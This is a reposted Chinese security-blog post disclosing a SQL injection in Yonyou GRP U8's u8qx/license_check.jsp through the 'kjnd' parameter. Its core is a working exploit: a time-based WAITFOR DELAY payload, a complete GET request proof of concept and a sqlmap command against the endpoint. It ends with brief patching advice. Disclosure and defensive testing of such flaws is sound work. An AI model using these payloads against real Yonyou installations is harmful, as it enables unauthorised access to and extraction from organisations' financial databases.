#  用友 GRP U8 u8qx/license_check.jsp 存在SQL注入

[ 哈拉少安全小队 ](javascript:void\(0\);)

**哈拉少安全小队** ![]()

微信号 gh_b273ce95df95

功能介绍
专注安全技术分享，涵盖web渗透，代码审计，内网/域渗透，poc/exp脚本开发，经常更新一些最新的漏洞复现，漏洞分析文章，内网渗透思路技巧、脱敏的实战文章、waf绕过技巧以及好文推荐等，未来着重点会在java安全相关分享。

____

___发表于_

收录于合集

以下文章来源于浪飒sec ，作者浪飒

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM45TibBevTywWA8traEUOtoPqWMuPlsD5lnziaibMXeAWFnQ/0)
**浪飒sec** .

浪飒，共建网络安全

**废话**

用友大哥上回这是专门给我打了个补丁，我发完三个小时就发布公告和补丁了，感觉自己被重视了。

![]()

![]()

 **正题**  

这个漏洞我看别人刚发的，我在官方补丁里没找到，发的人也没把poc放出来，参数名没打码，叫 kjnd，放到什么付费星球了，我就根据打码信息找一下。  

上回发的[ **【附POC】用友GRP-U8 bx_historyDataCheck.jsp
SQL注入漏洞**](http://mp.weixin.qq.com/s?__biz=MzI1ODM1MjUxMQ==&mid=2247493745&idx=1&sn=ed37ea21fa98dd97f5e2ebc096eec452&chksm=ea0bdc61dd7c55779d1c454756909716b2181d56a240878249696432637b17413984e6896cff&scene=21#wechat_redirect)
这篇也是u8qx路径下jsp的有SQL注入，payload如下：  

  * 

    
    
    ';WAITFOR DELAY '0:0:5'-- q

这次我猜这次payload还是这个，您猜怎么着，那叫一个地道，那叫一个美，妈妈的味道！

![]()

poc数据包献上:  

  *   *   *   * 

    
    
    GET /u8qx/license_check.jsp?kjnd=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36Connection: close

sqlmap命令如下：

  * 

    
    
    sqlmap -u http://127.0.0.1/u8qx/license_check.jsp?kjnd=1 -dbms=mssql

![]()

 **建议**

开发：建议把u8qx下的所有jsp进行测试，这玩意漏洞真多。

客户：找资产的时候有的系统已经修了，建议没修的联系销售让用友售后打补丁。

白帽子：建议把漏洞交给我，不要给别人![](https://res.wx.qq.com/t/wx_fed/we-
emoji/res/v1.3.10/assets/newemoji/Yellowdog.png)。  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

